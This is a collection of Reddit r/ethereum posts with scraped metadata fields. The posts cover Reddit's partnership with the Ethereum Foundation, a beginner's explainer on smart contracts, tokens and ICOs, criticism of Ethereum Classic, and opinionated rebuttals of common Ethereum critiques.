Through this partnership, we will be increasing our commitment to blockchain, accelerating scaling and resources for the Ethereum ecosystem, and bringing the value and independence of blockchain technology to millions of redditors.In many ways, this collaboration started with the [Scaling Bake-Off](https://www.reddit.com/r/ethereum/comments/hbjx25/the_great_reddit_scaling_bakeoff/) that we hosted in this community with the Ethereum Foundation. In this new stage of our partnership, immediate efforts will be focused on bringing Ethereum to Reddit-scale production. Our intention is to help accelerate the progress being made on scaling and develop the technology needed to launch large-scale applications like Community Points on Ethereum. The scaling technology developed through this partnership will be open-sourced and publicly available for anyone to use.We introduced [Community Points](https://www.reddit.com/community-points/) last year to give more ownership and control back to users through decentralized technology. Built on Ethereum, Community Points represent a user's ownership in a community and rewards them for their individual contributions (such as posts and comments). This project is our first attempt at utilizing decentralized technology to empower individuals to have a sense of accountability and more ownership in the communities that they create and contribute to. Community Points are currently in beta on the Rinkeby network and are being tested in [r/CryptoCurrency](https://www.reddit.com/r/CryptoCurrency/) and [r/FortNiteBR](https://www.reddit.com/r/FortNiteBR/).Our blockchain efforts will be led by Reddit's Crypto team (hi!). We are currently [hiring](https://boards.greenhouse.io/reddit/jobs/2413930) great backend engineers who want to build the decentralized Internet. If you're interested in solving tough problems like scaling and bringing blockchain to millions of users, send me a PM or apply directly on Reddit's careers page -- we'd love to talk to you!We're looking forward to working closely with the Ethereum Foundation, and contributing more to the broader Ethereum ecosystem -- and we hope to share some exciting announcements over the next few months.

I'm also writing a blog that aims to explain blockchain technology simply to anyone whose interested. www.cryptoambit.comIf you guys could spot check my Ethereum post for accuracy, I'd appreciate it. If you like it, would also appreciate some subscribers! Thanks _____________________________________________By now, most people know Ethereum as the second most valuable cryptocurrency, currently valued at over $60 billion dollars. Well, it turns out that Ethereum isn't actually a cryptocurrency - it's a software platform that let's programmers build applications on top of blockchain technology. Within the ethereum platform, is a cryptocurrency called ether that is used to power applications built on the Ethereum blockchain. **From Bitcoin to Ethereum**Bitcoin uses a global network of computers that maintain a shared ledger called a blockchain that keeps track of who owns bitcoin. Once blockchain technology was introduced to the world, people realized that blockchains could be used to keep track of anything of value. In 2013, a 19 year old named Vitalik Buterin introduced the Ethereum white paper, which proposed an open source platform that would let programmers build blockchain applications that could facilitate the exchange of money, content, property, shares or anything of value. Much like with Satoshi Nakamoto's paper, Buterin's was met with widespread excitement from software developers around the world who began building toward the vision Buterin laid out.Much like Bitcoin, Ethereum isn't owned or controlled by any one person. Unlike Bitcoin, whose creator remains anonymous, Ethereum has a leader in Vitalik Buterin (pictured below). While Buterin doesn't control Ethereum in the way that a CEO does, his word carries tremendous weight in dictating the direction of the project - something that is considered a strength or a weakness, depending on who you ask.**Smart Contracts**The basic function that programs built on Ethereum perform are called smart contracts. Smart contracts are digital agreements that execute automatically based on real world data. An easy way to think of them is an 'If-then statement.' IF condition A exists, THEN perform function B. Let's say for example Grandma wants to make sure she never forgets to give Little Billy birthday money each year. She could write a smart contract that says IF it's Little Billy's birthday, THEN pay him $10 from Grandma's account. Once this contract is broadcast to the Ethereum network, it will execute automatically each year on Little Billy's birthday. Smart contracts have applications far beyond improving the reliability and efficiency of Grandmothers around the world. Another simple application of a smart contract is for rental payments: IF date = 1st of the month, THEN pay landlord rent amount. Processes that currently involve manual interactions between two parties can now be automated and the value can be moved in real time over the blockchain rather than settling days later as with traditional banking. **A Real World Example**Ethereum and smart contracts are a big deal because they have the ability to usher in what's been dubbed the 'smart economy' - one in which slow manual processes prone to human error and deceit are replaced with automated processes that are completely transparent and trustworthy. A real world example that typifies the new 'smart economy' is a project being run by a French insurance company called AXA. AXA offers a flight insurance product that pays out a policy holder in the event that a flight is delayed by two hours or more. It currently has a product in trial that will pay out insurance claims using smart contracts and the Ethereum blockchain. The smart contract is simple: IF flight is over two hours late, THEN pay policyholder. The smart contract is connected to a database that monitors flight times. If the database shows that the flight is over two hours late, the smart contract is triggered and the policyholder is paid automatically over the blockchain. Without the smart contract, the policyholder would have to file a claim and wait for the insurance company's claims department to process it, which could take anywhere from 1 to 2 weeks. With the smart contract, neither the insurance company nor the policyholder has to do anything. This also creates trust between the two parties because there are no grey areas - the customer can review the smart contract prior to purchasing the policy and feel comfortable that he will receive his claim in the event of a delay. **Ethereum vs Ether**As stated in the intro, Ethereum is a platform for building blockchain applications using smart contracts. What you may have just purchased on Coinbase is called Ether, which is the cryptocurrency that fuels the Ethereum network. Ether functions more like a digital commodity than a digital currency. Just like you need gasoline to fuel your car, you need Ether to run applications on the Ethereum blockchain. In the Grandmother example cited above, Grandma would have to purchase small amounts of Ether to fuel her smart contract that pays Little Billy his birthday money. The Ethereum blockchain functions in the same way as the Bitcoin blockchain: a network of computers run software that validates transactions through majority consensus. The people running these computers are called miners. Bitcoin miners are compensated for their resources by being paid in Bitcoin. Ethereum miners are compensated in Ether. On Little Billy's birthday, Grandma's ether transaction fee will go to whichever miner adds the block containing Grandma's transaction to the blockchain. That miner will also receive new Ether in the process.The same supply/demand economics that apply to commodities like oil and gas also apply to Ether. Oil is valuable because it powers many of the things we use in our everyday life - it heats our homes and fuels our engines. The more people and enterprises that rely on Ethereum based applications, the higher the demand will be for Ether which will increase its value. As with all cryptocurrencies, there's plenty of speculation baked into the price - speculation that the demand for Ether will increase in the future. Since Ether is valuable, exchangeable and transferable, certain merchants are also starting to accept it as a currency. **dApps - Decentralized Apps**  Applications that run smart contracts on the Ethereum blockchain are called 'dApps,' or decentralized apps. Just as any app developer can build apps on top of Apple's IOS operating system, developers can build on top of Ethereum's blockchain infrastructure. To the end user of a dApp, it might not look and feel any different than the apps you use today. It's the underlying blockchain infrastructure that make them different. Since dApps function on top of the blockchain, they can be used to transfer value peer-to-peer. To return to our Grandmother example, there could be a dApp that Granny can download that lets her schedule Little Billy's birthday payments without having to code the smart contract herself. dApps are also completely open sourced so other people can access the code and build on top of them. Someone could take the code to the birthday payment dApp and add the ability for Grandma to add a note that says, 'Happy Birthday Billy!' Running dApps on the blockchain also offers added security benefits. Since the transactions are distributed and encrypted across the Ethereum blockchain, there is no central place for a hacker to breach and gain access to all of the world's Grandmother to grandson birthday payment data. At this point, I'm really beating the Grandmother/Little Billy example to death because I think it represents a simple illustration for the kinds of applications that can be built on the Ethereum blockchain. In reality, the dApps that are being built are much more complex. Here are a few examples: * **Weifund - blockchain crowdfunding:** Users can launch traditional crowdfunding campaigns, but through the use of smart contracts, backers can gain a financial stake in the project. If an indie film gets funded on Weifund, a backer who financed 10% of the project can collect 10% of the film's revenues. Payments will be issued in real time as the film generates revenue. * **Ujo Music - Music licensing via the blockchain:** An artist can create an original song and register it on Ujo's platform and set their own licensing terms. If a film producer wants to use that song in a movie, they can purchase the rights based on the terms set by the artist who will then get paid directly. This erases the need for industry middlemen like Warner Brothers who end up taking the lion's share of their artist's profits. * **Virtue Poker - Online poker secured by the blockchain:** At the height of it's popularity, online poker platforms like PokerStars were marred with issues that ranged from deck rigging to the abuse of player funds held by the company. Virtue Poker using Ethereum allows players to fund their bets directly, insuring that no central party can access and misappropriate player money. Their code is open sourced so that users can understand how hands are dealt, insuring that no one can rig the deck. Lastly, players are paid out their winnings in real time over the blockchain so no more waiting weeks for a check to come in the mail. **Ethereum Tokens**So now that you understand that Ethereum is a network for building decentralized applications that require a cryptocurrency called Ether to run, I'm going to introduce a confusing concept. Many dApps built on Ethereum have their own cryptocurrencies or 'tokens.' In order to interact with the dApps, customers need to purchase the dApp's native token. Here's a helpful analogy I came across - when you go to a waterpark, you pay the admission fee and in return, you get a wristband. That wristband gives you the ability to ride the waterslides in the water park. With certain dApps, the token is the wristband, and a user must purchase it to interact with whatever the dApp offers. Let's take a dApp called Golem as an example. Golem lets people rent out their excess computing power to people who need it - kind of like a computer AirBnb. To cite this article from Laura Shin, if I'm a computer graphics artist that wants to render some kind of computationally intense animation, I can purchase Golem tokens that let me tap into the Golem network to generate my animation. I then pay the people who are renting me their computers with the Golem tokens. The Golem token is a form of smart contract and this transaction is recorded on the Ethereum blockchain. Since Golem tokens are also a cryptocurrency, they can be traded on the free market. If I'm a speculator who has no intention of using the Golem network to rent computing power, I can still buy the Golem token on an exchange in hopes that it appreciates in value. Like bitcoin, there is a fixed supply of Golem tokens so if the demand for the service increases, so will the value of the token. If I bought Golem at its original price of around 1 penny and held it to today, I would have made 35X my initial investment since Golem tokens currently trade around 35 cents a piece. **ICOs**ICO stands for, 'Initial Coin Offering' which is a fundraising mechanism for cryptocurrencies which has exploded in popularity this year - the majority of them are held on the Ethereum network. Similar to a kickstarter campaign, they allow entrepreneurs to raise money for projects by giving investors an early opportunity to purchase the cryptocurrency before the final product has been built. If the project is successful, the value of the cryptocurrency will rise in value and early investors can sell it on the open market for a profit.ICOs have stirred up a lot of controversy because they represent a risky proposition with zero investor protection. Let's say I wanted to build a casino and to finance it, I gave investors the opportunity to buy chips that can be used at my roulette tables once the casino opened. If you bought $100K in roulette chips from me and I decide that I no longer want to build the casino, you're stuck holding worthless chips. If investors don't do their due diligence, they may end up buying tokens for a project whose creators never intended on building it in he first place - the creators walk away with the money and the investors have no way of recouping their funds. On the other hand, early investors in projects that go on to be successful have the opportunity to make enormous returns. For example, people who invested $1,000 in the Golem ICO would be sitting on $35,000 at it's current price of $0.35 - if it ever goes to $10, they're all millionaires. Another positive aspect of ICOs is that they let anyone, rich or poor get involved in early stage investing. To invest in a company like Twitter or Facebook pre-IPO (initial public offering), you need to be an accredited investor - this basically means you're already a rich person. With ICOs, all you need is an internet connection and a little bit of money and you have the potential to become wealthy by investing in the right projects.**Far From Perfect**Ethereum has the potential to change the way humans transact with one another but it is still a very young technology and it hasn't been without its problems. While the blockchain architecture underlying the Ethereum network is secure, not all of the applications built on top of it are. Faulty code can and has made applications vulnerable to hacking and malfunctions. Here are two prime examples: **DAO Hack** - DAO was a dApp built on Ethereum that enabled crowd based venture capital. DAO token holders were given the right to vote on projects they wanted to support - if projects went on to be successful, DAO token holders would receive financial rewards. The DAO ICO received $168 million in funding. The DAO software was hosted on the Ethereum blockchain and was publically visible by all. A hacker spotted a flaw in the DAO's code that enabled him to route $55M in ether held by the DAO into an account that he controlled. The Ethereum team had do do something called a hard fork (something I won't get into now) to reverse return the stolen funds.**Parity Wallet Freeze** - Parity is a wallet where people store Ether. A flaw in Parity's code let a user delete a specific line of code that was necessary for accessing funds in a Parity wallet. This led to $280 million dollars worth of ether being frozen - it hasn't been stolen but it can't be accessed either. Parity Technologies has proposed another hard fork to correct the issue - something that is sure to divide the Ethereum community and rattle user confidence. Despite the world changing implications that Ethereum dApps and smart contracts have, the trouble is that any programmer can write them - if they aren't written properly, they can behave in unintended ways and be exploited like in the above listed examples. Ethereum is still a very young network and security issues with dApps and smart contracts will have to be sorted out if its to reach its true aspirations. **Leading The Decentralized Revolution**Ethereum aims to take the promise of decentralization, openness and security that is at the core of blockchain technology and brings it to almost anything that can be computed. - Vitalik Buterin With dApps, smart contracts and blockchain technology, Ethereum is leading the decentralized revolution. Bitcoin is the world's first decentralized currency, that operates on a global network of computers outside of central intermediaries. Ethereum gives programmers a platform to develop a decentralized version of just about anything.Decentralized networks like Ethereum have the power to remove the intermediaries that currently exist between producer and consumer. Let's take a company like Uber. Uber is a platform that brings people who need rides together with people who have cars. To facilitate this interaction, Uber collects 20% of every ride. With Ethereum and blockchain technology, there is nothing to prevent a bunch of software developers from writing a dApp that creates a decentralized Uber. Instead of 20% per ride, transaction fees are paid to the network and the driver takes home the lions share of the transaction. Tokens can be issued that represent ownership in the network. Coders who work on improving the network can get paid for their efforts in ownership tokens. Non-technical people can come up with marketing campaigns that spread awareness for the network and also get compensated in ownership tokens. As the decentralized Uber network grows and improves, the value of its ownership token increases, rewarding the people that built it. The result is whats referred to as a 'Decentralized Autonomous Organization' and theres a strong possibility that DAOs replace a lot of the world's biggest corporations. This may sound like a radical concept but blockchain technology enables these kinds of decentralized organizations to exist - Ethereum provides the tools for people to go out and build them.",False,r/Ethereum - I wrote this to explain Ethereum in depth to newbies.

Here are some facts.**= Origins =*** In 2016, a major smart contract on Ethereum with 14% of all extant ETH locked up in it (The DAO) suffered a hack (a bug with the smart contract, not a bug with Ethereum) that resulted in much of the ETH being stolen. The Ethereum community was split on what to do, and eventually there was a [controversial hard fork](https://www.gemini.com/cryptopedia/the-dao-hack-makerdao#section-the-response-to-the-dao-hack).* The **HARD FORKED** chain (with all the hacked ETH put into a different, safe smart contract for withdrawal by its original owners) became today's **Ethereum** chain. Ethereum has not conducted any further chain-state-changing hard forks after that point.* The **UNCHANGED** chain (with the attacker keeping the stolen funds) became **Ethereum Classic**.**= Network Effects and DeFi =*** The large majority of the Ethereum community decided that Ethereum was the legitimate chain. As a result, it has subsequently seen the vast majority of development and usage compared to Ethereum Classic, and all of the DeFi and other dApps we have come to know and love are built on Ethereum, **NOT** Ethereum Classic. Thousands of interconnected dApps exist on Ethereum.* By comparison, almost no development has taken place on Ethereum Classic. Developers want to go where all the other developers are, and that is *not* Ethereum Classic.**= Security =*** Ethereum is one of the most secure decentralized chains out there, along with Bitcoin.* Ethereum Classic has a tiny fraction of the hash rate that Ethereum does (under 2% until the past few days), leaving it vulnerable to 51% attacks, [four of which](https://www.coindesk.com/ethereum-classic-blockchain-subject-to-yet-another-51-attack) have happened so far. This is where an attacker buys or rents a bunch of hashpower, takes over the chain and executes invalid transactions for their own financial gain. It means the blockchain is fundamentally worthless (the entire point of a blockchain is to be trustlessly secure). These attacks were subsequently rolled back (ironically, given ETC's founding principle of not changing what happens on-chain), but not before weeks of headaches and lost transactions.**= Upgrades =*** Ethereum has received regular hardforks over its history. These hardforks have added features to Solidity (the programming language on both chains), fixed problems with the cryptoeconomic model, and improved user experience (UX), among many other changes. Soon, Ethereum will be transitioning to Proof of Stake, the most major upgrade since the chain was started.* Ethereum Classic has copied over some of these same hardforks from Ethereum, but also has added others that have led to it diverging from Ethereum. Importantly, it will not be transitioning to Proof of Stake or reaping any of the benefits from the other set of upgrades that were formerly collectively termed 'Eth2'.All of these reasons are why Ethereum currently has a much higher market cap than Ethereum Classic, and as a result, a higher price per coin. They are **NOT** 'the same chain'. Ethereum Classic is **NOT** 'the same but cheaper'. Ethereum has fantastic fundamentals, and Ethereum Classic has none. 'Price go up' is not a fundamental.Do with that information what you will.P.S. for more, please see [this post](https://old.reddit.com/r/ethtrader/comments/n6ecr4/ethereum_classic_is_not_classic_and_it_is_not/) in r/EthTrader",False,"PSA: Ethereum Classic (ETC) is a dead, insecure chain with no fundamental value",u/[deleted],31,3340,0.93,https://www.reddit.com/r/ethereum/comments/n6k7xi/psa_ethereum_classic_etc_is_a_dead_insecure_chain/,[]

Why only 1 second?Intuitively, it would seem to me that Proof of Stake (PoS) should be able to drastically reduce block times vs. Proof of Work since it replaces the computationally expensive PoW piece and the arms race nature of everyone mining at the same time with random validator assignment. Thus the bottleneck under PoS would only be the network latency it takes to propagate the newly created block to the number of validators required for consensus (51%?) + time it takes for those validators to validate/attest that newly created block and propagate their attestation back to everyone else. I don't know what the block propagation latency on ethereum is to reach 51% of nodes, but I can't imagine that being more than a few seconds.I understand that reducing block times too low under Proof of Work would be offset by increased computational waste and forking (due to everyone mining concurrently and network latency). But wouldn't this problem be eliminated under Proof of Stake, thus enabling faster block times (and subsequently higher transactions/second)? **(EDIT: I elaborated on my reasoning in** [**this comment**](https://www.reddit.com/r/ethereum/comments/slzfsd/comment/hvtw4et/?utm_source=reddit&utm_medium=web2x&context=3)**)**Is there a detailed explanation/analysis somewhere comparing Proof of Stake vs. Proof of Work from a performance standpoint?

Now onto the reasons why this was a really smart move:1. The end of Meme Investing and people falling into the pump and dump crypto schemes. Vitalik, by donating the Shibacoins away, crashed the price immediately after the announcement was made. Now onto the reason why 'meme coins' are bad. Meme coins are a shell of a useless ERC-20 token that anyone could make in minutes if they were willing to spend $200 upfront. The creators of these tokens then pay influencers on social media apps, pumping up the price; when the price is high enough, they sell, causing a massive crash as everyone runs to the doors to exit their position. 'Meme coins' should be completely purged from the crypto space, I myself take investing to be an extremely serious topic, therefore I believe the cryptocurrency space should be kept for only serious projects that are providing value to society.2. The second reason why the donation was a smart play is that the country he donated Shibacoins to, India, had been planning on banning cryptocurrencies as a whole. With the donation being in an ERC-20 token, India would have no choice but to take the money as crypto, therefore improving the chances of the country re-allowing cryptocurrencies for its residents. This is bullish news for the crypto space in general, India being the second most populated country in the world would mean there would be more money being injected into crypto.3. The third and final reason, which is probably the least important and probably not good news (to miners) is that with the dump of the tokens, gas fees would be lowered. This is good news for all users of Ethereum as gas fees were trending at all-time highs the past few days, and with the announcement of the donation this morning, the gas fees have already gone down to around 120 gwei. TLDR: With the donation of the Shibacoins, Vitalik effectively has begun a fight against meme pump and dump coins, began a campaign to re-allow cryptocurrency use in India and lower the transaction gas fees.",False,Why Vitalik Made a 500 IQ Play Today With the 1 Billion Dollars Donation,u/[deleted],20,2737,0.95,https://www.reddit.com/r/ethereum/comments/nb963i/why_vitalik_made_a_500_iq_play_today_with_the_1/,[]

Given that a CBDC is coming that will probably be all of them.* Penalize privacy coins and mixers* Label smart contracts that take longer than 24 hours to complete as futures contracts and regulate them accordingly* Authorize the creation of a digital dollar CBDC in which all transactions are recorded* Absolutely fucking wreck our shitIt's hard to overstate how detrimental this would be to crypto. This would blow an enormous hole in defi and the rest of the cryptocurrency space, and put a huge handicap on it's ability to recover.

(PS: I tried posting this in r/cc and r/ethereum and as expected, they were removed. So if you know what's required to get such a post approved, please feel free to repost.)Special shoutout to r/ethfinance folks for contributing questions.# Ethereum can't scaleThis is demonstrably false because there are multiple rollups currently online, some of which have been running for a year now! Here are some examples that you can use today: Loopring, zkSync, DeversiFi, Hermez, Aztec, dYdX, Immutable X etc. Most of these projects can process thousands of TPS with such low gas fees that some of them subsidize it (or abstract it away from UX), so the users effectively pay zero gas.What's missing are generalized programmable rollups. Optimism has been live on mainnet since January, but is currently restricted to only Synthetix. Uniswap V3 is the next major release on Optimism, before finally opening it up for public smart contract deployment in July or later. By the way, Optimism have done a *terrible* job with communications this year - criticism is certainly due here. Engineering-focused project or not, communications & public relations are always important.But Optimism is just one solution. Other solutions like zkSync 2.0, Arbitrum and StarkNet will be rolling out over the course of the year, and we have more like OMGX and Cartesi joining the fray. Indeed, it now seems likely Arbitrum will be publicly available ahead of Optimism. Not to mention sidechains or commitchains like Polygon or xDai, or other EVM chains like BSC or Avalanche. Ultimately, all of these are part of the extended Ethereum ecosystem.At the same time, this is also partially true. I will note that Ethereum L1 gas fees will likely remain high forever, short of some exotic technology that doesn't yet exist. Even on rollups, you're not going to get dirt cheap fees until data sharding is released, which is a couple of years away, and even that won't be enough long term. And that's just fine... There's simply overwhelming demand for EVM blockspace.Related: [Opinion: Rollups are 4th gen blockchains : CryptoCurrency (reddit.com)](https://www.reddit.com/r/CryptoCurrency/comments/my0h9s/opinion_rollups_are_4th_gen_blockchains/)# High gas fees will kill EthereumThis is one of those bizarre comments that pervades through crypto retail doesn't seem to make any sense. Overwhelming demand for a product will somehow... kill a project? It's like saying AMD and Nvidia are going to die soon because graphics cards are now grotesquely overpriced.No, the reality, like I said above, is that there's overwhelming demand for EVM blockspace and a limited supply of gas. Currently, the high fees shows there's incredible demand for Ethereum L1 blockspace, and people are willing to pay a steep premium for it.**This is what gives the Ethereum network and ETH value. And in two months' time, there'll be a mechanism with EIP-1559 to accrue this value to every ETH stakeholder.**Over time, we will see gas fees drop with a greater supply of gas - the reality is that there'll never quite be enough blockspace supply to satisfy global demand for EVM blockspace long term. There'll be rollups, there'll be hybrid solutions like zkPorter/Validium, there'll be sidechains/alternate chains, and there'll be centralized solutions. The ecosystem will work together to offer different trade-offs with decentralization versus transaction fees.# Ethereum is centralized, all decisions are made by VitalikWhile Vitalik remains an important part of the Ethereum ecosystem, Ethereum development has become sufficiently decentralized over time. Unique to Ethereum is a multi-client approach, where researchers work with developers to create plain text specifications. These specifications are then implemented by multiple client developers who work independently. This is different to all other blockchain projects where the core team develops a single client. Now, of course, there are arguments for a single client - putting all resources into one client could make for a higher quality client than 4 or 5 not-as-high-quality client, but this is clearly the most decentralized approach. For example, there are currently 4 consensus layer clients in production, and 1 more in development - all developed by teams independent of the Ethereum Foundation (apart from receiving grants). For any consensus forks, these 5 development teams have to agree on upgrades, and then 135,000+ validators do as well. This is not how a centralized network functions. Not to mention Ethereum's strong 'Layer 0' that all developers and validators listen to intently - its community. For example, EIP-1559 has been significantly motivated by the will of the community.# Ethereum was premined. Ethereum is controlled by Vitalik. (u/aaqy, u/ec265)I'm not a fan of ICOs, and Ethereum certainly did have one. I don't like ninja mining either, like Bitcoin. We have seen some DeFi projects have fair launches with airdrops to users, and this is certainly the best way to distribute tokens.However, It's important to understand the context - back in 2014 this was simply the fairest way to raise funding. At genesis, Ethereum Foundation held '~12M ETH. However, over the years, this has been distributed - a lot of it seems to be fundraising in the early years. Currently Ethereum Foundation and early developers hold '~2% of the supply at most. Vitalik owns 0.3% of all ETH.Contrast this with other projects where the founders often hold 20% or more, public corporations like Tesla or Amazon with a similar amount, or Satoshi holding 5% of all BTC. (Was as high as 50+% in 2009/10, and yes, they are assumed lost and not comparable anyway.) I would even go ahead and say that 0.3% is absolutely not enough to adequately incentivize a founder to keep working on the project!Would I have preferred to see Ethereum do a fairer launch? Sure. But today, in the here and now, Ethereum has the fairest distribution among founders of any project.# Mining is destroying the environmentWhile there are nuances to do this, this one's actually true to an extent - mining is highly inefficient. Fortunately, Ethereum is moving to proof-of-stake within the next 9 months, which will cut Ethereum's energy consumption by 99+%.It's not just about electricity either. We know there's a significant global shortage for semiconductors right now. A lot of TSMC's limited wafer supply currently being used to fabricate mining-related silicon (ASICs, GPUs) can be reallocated towards CPUs, ASICs and GPUs more productive usecases like engineering, science, and of course, gaming.# Ethereum did a rollback and will do it againPeople like to point to the DAO fork as proof that Ethereum is not immutable. But there are many nuances to this that are disingenuously ignored:'- Firstly, the DAO fork was not a rollback. It was a unique situation where the hackers had to wait 28 days for withdrawals, so a smart contract change was executed.'- There was strong consensus across developers, users, miners and community alike - it was hardly a centralized decision.'- Those who disagreed simply moved to Ethereum Classic. It's a win-win situation for all.'- Ethereum was still a very, very new project then. You know which other project did a rollback when it was less than 2 years old?  [Value overflow incident - Bitcoin Wiki](https://en.bitcoin.it/wiki/Value_overflow_incident)'- [EIP-999 being rejected](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-999.md) is the final deathblow to this hypothesis. There was a chance to rollback 500,000 ETH to an entity managed by one of its co-founders, and the community overwhelmingly rejected it. **Rollbacks do not happen on Ethereum.**# Ethereum relies on InfuraWhile it's certainly true that Infura is a dominant service provider, and the ecosystem definitely needs to diversify, this is demonstrably false. Infura [suffered a massive outage in November 2020](https://blog.infura.io/infura-mainnet-outage-post-mortem-2020-11-11/), yet Ethereum kept running just fine. Sure, it disrupted some frontends, exchanges and wallets, but nothing that couldn't be fixed with simply running your own node or using a different service. Since this outage, many frontends and wallets have started running their own nodes and using alternatives like Alchemy. There's still more work to do on this front, but to say Ethereum is reliant on Infura is false.# Ethereum state is growing too fastCompared to Bitcoin, this is certainly true. If you want a chain that's easiest to play back in archival mode, verify every transaction from genesis, then yes, Bitcoin is a better option. It's just a question of how valuable this really is - given you're trusting Bitcoin miners already if you want to use their network? With Ethereum, you can run full nodes (not archive) on a Raspberry Pi 4 with a 1 TB SSD, and send and verify transactions. This is relatively accessible hardware to most users and consumers. Some would argue that clients like TurboGeth makes this easy enough even for archive nodes.On a related note, Ethereum's state growth is much, much closer to Bitcoin than Binance Smart Chain, EOS, Solana or other high-TPS L1 chains. The concept of users verifying transactions don't even exist for these chains.As a side note, Ethereum will make more such trade-offs going forward with weak subjectivity, statelessness, state expiry etc. Purists will cry foul, and that's fine - there'll be an audience that will gladly trade-off being able to sync from genesis given the tremendous benefits elsewhere.# Ethereum has no fixed capThis is true, but there are good security reasons for it. I'd add that with EIP-1559 and The Merge, it is somewhat likely ETH will hit a maximum supply of around '~120M and continue deflating or stabilising from there.# Ethereum's monetary policy is unreliableThis is also partially true. While many exaggerate, it is true that Ethereum has seen 2 cuts in block rewards, and these were made by social consensus rather than code. EIP-1559 and The Merge completely overhaul Ethereum's monetary policy. But yes, until EIP-1559 and The Merge prove themselves on mainnet without further changes over several years, this remains a valid criticism. Bitcoin remains the standard for predictable and reliable monetary supply - though it does trade-off with a security risk in the future.# Ethereum 2.0 is years awayThere are a lot of misconceptions about 'Ethereum 2.0', though the Ethereum researchers an developers are largely to blame for confusing communications. Firstly, we don't even call it that anymore. Anyway, this just refers to a series of upgrades. The first upgrade, beacon chain, went live in Dec 2020, The Merge is actively being developed (the second devnet is going live today) and scheduled to release by late 2021. Next comes data sharding. Another misconception is these upgrades will lead to low gas fees - definitely not on L1. What data sharding will do is accelerate rollups. A much greater impact to L1 will be statelessness+state expiry, plus sharding execution if it's ever required. (The jury's now out on that one...)# Ethereum has no intrinsic value, it's all created from thin airEthereum is a global, decentralized SaaS platform and collects revenues in transaction fees. These transaction fees are now substantial - over $1 billion per month. Indeed, yesterday, Ethereum generated $117M ([cryptofees.info](https://cryptofees.info)), which is $43B annualized. This would put Ethereum as #2 compared to the largest corporations in the world. I don't think this sort of activity is sustainable for now, but it shows you that it's possible, and gives you a glimpse into the future.With EIP-1559 releasing in July, a majority of these transaction fees will be burned, directly accruing value to all ETH stakeholders. Following The Merge, the remaining non-burned fees (tips) will be returned to stakers, in addition to the yield they generate.Not only is Ethereum one of the most productive assets in the world, it also has the most advanced accrual mechanisms.# It is too difficult to stake ETHThis is definitely valid, 32 ETH is a lot of money. However, I think there's a significant misconception about what staking is. On many of the delegated-type chains, when you're 'staking' what you're actually doing is just delegating to someone else. Some newer models like Algorand randomizes this process, but you're still delegating, rather than validating. You're effectively being given free money for not really doing anything. Early delegated-type systems like BitShares or EOS never paid delegators, so the validators ended up bribing delegators. The new delegated-type systems simply 'pre-bribe' delegators. Of course, validators can still bribe delegators from their rewards, but that's a separate discussion.In Ethereum beacon chain, you are validating your own ETH, and thus earning staking fees for providing a service to the network.Those that just want to stake and don't care about these technicalities, beacon chain is just the base layer, and we have multiple staking services being built on top of it, with various levels of decentralization. These staking services let you earn staking rewards for small amounts of ETH. See the full list here:  [Ethereum 2.0 Beacon Chain (Phase 0) Block Chain Explorer - Ethereum 2.0 Staking Services Overview - beaconcha.in - 2021](https://beaconcha.in/stakingServices)# Ethereum never executes upgrades on time and constantly change their plans (u/I_haven-t_reddit)Does Ethereum constantly change their plans? Yeah, that's definitely true. But it's simply pragmatic. This industry is innovating rapidly, and when you have exponential advancements, it doesn't make any sense to just stick to old tech. Abandoning the hybrid PoW/PoS makes sense, even if it means you lose out a year or so of research. Going for a rollup-centric roadmap makes sense, simply because it'll deliver massive scalability sooner than anyone imagined. Upgrades are definitely being executed - the beacon chain went live in Dec 2020, EIP-1559 happens in two months' time, and The Merge goes less than 6 months after that.A perfect counter case would be Cardano, which is basically obsolete 2015-era tech. DPoS, single-ledger, relying on state channels and sidechains for scalability. By rejecting significant advancements like signature aggregation, sharding and rollups, they are destined to be stuck in the past. OK, maybe that's a poor example because despite being obsolete they still can't execute. Seriously, though, the actual counter case is, of course, Bitcoin. And that's just fine - a model like that makes sense for something that just wants to be money and nothing else.# Proof-of-stake increases centralization by concentrating wealth (u/epic_trader, u/Mathje, u/sn00fy)While this seems to make sense at first glance, there are many nuances to this:'- Ethereum has had the benefit of 6+ years of proof-of-work, and we've seen significant token distribution in that time. Now, the distribution is relatively decentralized and second only to Bitcoin.'- Validators and (non-validating) stakers have costs too. While hardware costs are significantly lower, there'll be taxes and overheads which will be redistributed.'- The biggest factor often overlooked is that proof-of-stake has very, very low issuance. When The Merge happens, issuance will be '~0.5%. A validator cap is being proposed which will also subsequently cap issuance at only 0.8% or so.Proof-of-work may still have better redistribution characteristics, but it's marginal at best.# Even if companies adopt Ethereum they will just run a private chain (u/sn00fy)Not just companies, but we're going to see private chains being run for consumers. We are already seeing some of this with Binance Smart Chain, but in the future, I'd speculate have big players like governments, banks, and corporations run private chains.Naturally, there'll also be business adoption for the public chain with B2B activities.Like I alluded to at the very beginning, only a very limited amount of gas will be consumed on the Ethereum L1 chain long term. But that doesn't matter - L1 will be 100% saturated at all times, and other solutions building with Ethereum only adds to its network and Lindy effects.# Ethereum has old tech, new chains have newer tech (u/Mathje)Of all the misinformation and FUD that pervades this space, this is the one that grinds my gears the most. Ethereum has always been at the bleeding edge of innovation, and continues to be. While there are certainly innovative projects in the space, absolutely nothing is even attempting to solve the big problems: the blockchain trilemma. Consider this: every other smart contract chain uses some form of delegated-type consensus mechanism, many with a hard cap on number of validators. Cosmos: 300 (currently 150); Polkadot: 1,000; Binance Smart Chain/EOS: 21. The ones that end up with more validators have to compromise on scalability.Beacon chain uses revolutionary new techniques like weak subjectivity and signature aggregation to enable massive decentralization with up to a million validators. There are 135,000 validators live already despite being none more than an incentivized testnet, with thousands being added every week. Not to mention, beacon chain validators are not required to be online 24x7 like the other chains.Or, consider this: these L1 chains can offer more throughput than Ethereum's '~55 TPS for ETH transfers, or '~20 TPS overall, sure. But Ethereum is empowering rollups with data sharding to scale to 100,000 TPS and beyond, with groundbreaking new tech (data availability sampling) securing it all without compromising decentralization. No L1 will ever scale to these levels, even after absolutely giving up on decentralization. Not even considering hybrid solutions like zkPorter or Validium.Or, consider this: the most innovative chains are actually rollups. Just look at the phenomenal work being done by StarkNet. There's a good reason they are becoming rollups on Ethereum and not anywhere else - it has the best consensus mechanism in the industry.Or, consider this: Pretty much every innovative new smart contract is released on Ethereum, and then copy-pasted to other chains.In short, the Ethereum ecosystem has far and away the most cutting-edge tech in the industry.# There is no real use case for Ethereum. It's only used by degens for gambling and exchanging other tokens that are just as useless. (u/sn00fy)Degens are paying transaction fees just like everyone else - the whole point of credible neutrality and permissionless means Ethereum does not 